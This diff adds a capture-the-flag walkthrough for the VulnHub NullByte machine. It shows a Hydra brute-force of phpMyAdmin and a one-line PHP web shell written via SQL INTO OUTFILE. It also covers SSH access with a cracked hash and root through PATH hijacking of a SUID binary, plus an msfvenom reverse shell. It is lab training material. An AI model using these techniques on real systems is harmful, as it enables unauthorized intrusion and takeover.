@@ -1,0 +1,191 @@
+I"�#<h2 id="vm-description">VM Description</h2>
+
+<p>This CTF is one of the recommended machines for those preparing for the OSCP exam. It has basic to intermediate difficulty. The objectif is to get the proof.txt flag in the root directory.</p>
+
+<p>Download: <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">Nullbyte</a></p>
+
+<p>Author: <a href="https://www.vulnhub.com/author/ly0n,153/">Ly0n</a></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>We configure the VM in bridge mode. In order to determine its assigned IP, we run the below command:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span>arp-scan <span class="nt">-I</span> wlan0 <span class="nt">-l</span> 
+</code></pre></div></div>
+
+<h4 id="service-enumeration">Service Enumeration</h4>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-oA</span> nmap/nmap 192.168.1.142
+</code></pre></div></div>
+
+<div class="row">
+  <div class="col-md-6">
+    <table class="table table-bordered">
+      <thead>
+        <tr>
+          <th>Open port</th>
+          <th>Service</th>
+          <th>Version</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>80</td>
+          <td> http </td>
+          <td>Apache httpd 2.4.10</td>
+        
+        </tr>
+        <tr>
+         <td> 111 </td>
+          <td> rpcbind </td>
+          <td> 2-4 </td>
+        </tr>
+
+ 	<tr>
+         <td> 777 </td>
+          <td> SSH </td>
+          <td> OpenSSH 6.7p1</td>
+        </tr>
+
+       </tbody>
+    </table>
+  </div>
+</div>
+
+<h4 id="web-server-directory-enumeration">Web Server Directory Enumeration</h4>
+
+<p>Let’s use Gobuster to enumerate the web server’s directories.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.1.142 <span class="nt">-w</span> /usr/share/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> .php,.txt <span class="nt">-o</span> dirbuster-80.out
+</code></pre></div></div>
+
+<p>Gobuster returns the following directories: 
+uploads, javascript, phpmyadmin and server-status.</p>
+
+<p>Let’s check phpmyadmin as it’s the most promising.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/1.png" alt="phpmyadmin" /></p>
+
+<p>Default database credentials such as root:root do not work. We can either look for credentials by further enumerating available services or try to brute force the application.</p>
+
+<p>In order to save time, let’s run <a href="https://tools.kali.org/password-attacks/hydra">hydra</a> in the background as this process may take some time. We will use root as username and the most popular password list in Kali named <a href="https://github.com/praetorian-code/Hob0Rules/blob/master/wordlists/rockyou.txt.gz">rockyou.txt</a> and located under /usr/share/wordlists.</p>
+
+<p>Before running hydra, we need to remove empty passwords from the list as they result in a different error message which will stop the search (false positive).</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/2.png" alt="Hydra" /></p>
+
+<p>Quickly enough, hydra found the database password <em>sunnyvale</em>. Awesome :)</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>There are two ways to obtain a low privilege shell. The first method is to upload a php reverse shell via the mysql database and access it from the web server. The second way is to decode Ramses user password and connect to the target via SSH.</p>
+
+<h4 id="1st-method-to-obtain-a-reverse-shell">1st method to obtain a reverse shell</h4>
+
+<p>In order to upload a php reverse shell to the target via phpmyadmin; we need to:</p>
+
+<ol>
+  <li>
+    <p>Create a new database</p>
+  </li>
+  <li>
+    <p>Create a new table in the database.</p>
+  </li>
+  <li>
+    <p>Click on the created database to construct an SQL query:</p>
+  </li>
+</ol>
+
+<p>[SELECT “&lt;?php system($_GET[‘cmd’]); ?&gt;” into outfile “/var/www/html/backdoor.php”]</p>
+
+<ol>
+  <li>Visit target/backdoor.php and provide a cmd as a GET parameter.</li>
+</ol>
+
+<p>This <a href="https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/">post</a> in hackingaritcles.in describes the above steps in a more detailed manner.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/8.png" alt="new database" /></p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/3.png" alt="new table" /></p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/4.png" alt="shell1" /></p>
+
+<p>Based on the error message, it seems that we do not have enough permissions to write to /var/www/html. This is where a good enumeration comes in handy. Since Gobuster returned that uploads is a valid directory; let’s see if we can upload our PHP code there.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/5.png" alt="reverse shell in uploads" /></p>
+
+<p>Great. The command executed successfully. Let’s see if we have code execution.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/6.png" alt="command execution" /></p>
+
+<p>Awesome. You can now execute a reverse shell one liner. Check the <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell cheatsheet</a> posted by pentestmonkey.</p>
+
+<h4 id="2nd-method-to-obtain-root">2nd method to obtain root</h4>
+
+<p>Under Seth database, we find user ramses base64 encoded password. The decoded output is an MD5 hash based on the characters count. We search for the password in <a href="https://crackstation.net/">Crackstation</a>; a free password hash cracker.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/7.png" alt="passwords" /></p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/9.png" alt="base64 decode" /></p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/10.png" alt="counts" /></p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/11.png" alt="crackstation" /></p>
+
+<p>User’s Ramses password is omega. Great. Now we can connect to the target as this user.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/12.png" alt="ssh as ramses" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>We can read user’s Ramses bash history.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/13.png" alt="history file" /></p>
+
+<p>There seems to be an interesting binary under /var/www/backup. Let’s check it.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/14.png" alt="proc watch suid" /></p>
+
+<p>The program has the suid bit. Excellent. Let’s understand what it does by executing it.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/15.png" alt="executing ps" /></p>
+
+<p>Once we run it, we see that it execute ps binary.</p>
+
+<div class="panel panel-info">
+      <div class="panel-heading">
+        <h3 class="panel-title">Tip:</h3>
+      </div>
+      <div class="panel-body">
+  If a binary does not return any data and you'd like to know what it does exactly, before resulting to reverse engineering, run <a href="https://github.com/DominicBreuker/pspy">pspy</a> in the background and then run the binary. It should give you a solid idea of what is going on.  
+      </div>
+    </div>
+
+<p>Since the user did not indicate a full path to ps binary (/usr/bin/ps); We can exploit this to our advantage by putting a malicious executable in /tmp named ps and modifying the PATH variable to include /tmp. Therefore, the next time we will run Procyon, it will search for the ps binary in the /tmp folder as indicated by the PATH variable and execute our exploit as root.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="nb">echo</span> /bin/sh <span class="o">&gt;</span>ps
+<span class="gp">$</span><span class="nb">chmod</span> +x ps
+<span class="gp">$</span>/var/www/backup/procwatch
+</code></pre></div></div>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/16.png" alt="root1" /></p>
+
+<p>We can also create a reverse shell with Metasploit and name it ps. You will need to add PrependSetuid=True otherwise it will not execute with root privileges.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/17.png" alt="msfvenom payload" /></p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/18.png" alt="uploading to tmp" /></p>
+
+<p>Now we need to modify the path variable to include the /tmp directory.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</code></pre></div></div>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/20.png" alt="path update" /></p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/19.png" alt="reverse shell" /></p>
+
+<p>Now we have root shell. Awesome :) Let’s read the flag.</p>
+
+<p><img src="../assets/img/Walkthroughs/NullByte/21.png" alt="flag" /></p>
+:ET
